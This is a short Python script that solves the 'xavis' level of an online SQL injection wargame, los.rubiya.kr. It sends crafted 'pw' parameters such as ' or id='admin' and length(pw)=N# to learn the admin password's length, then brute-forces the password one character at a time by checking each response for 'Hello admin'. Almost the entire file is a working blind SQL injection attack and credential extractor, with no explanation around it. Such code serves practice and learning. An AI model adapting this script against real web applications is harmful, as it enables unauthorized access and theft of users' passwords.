import requests
import string
import os
from dotenv import load_dotenv

load_dotenv()

base_url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php"
cookie = {"PHPSESSID": os.getenv('PHPSESSID')}
pw_length = 0
pw = ""

a = string.printable

for i in range(100):
    res = requests.get(base_url, params={
        'pw': f"' or id='admin' and length(pw)={i}#"
    }, cookies=cookie).text
    if "Hello admin" in res:
        print("length: %d" % i)
        pw_length = i
        break

for i in range(pw_length):
    for j in a:
        res = requests.get(base_url, params={
            'pw': f"' or id='admin' and left(pw,{i+1}) in ('{pw + j}')#"
        }, cookies=cookie)
        # print(res.request.url)
        res = res.text
        # print(res)
        print(pw+j)
        if "Hello admin" in res:
            print(f"pw[{i}] == {j}")
            pw += j
            break
    print("nah")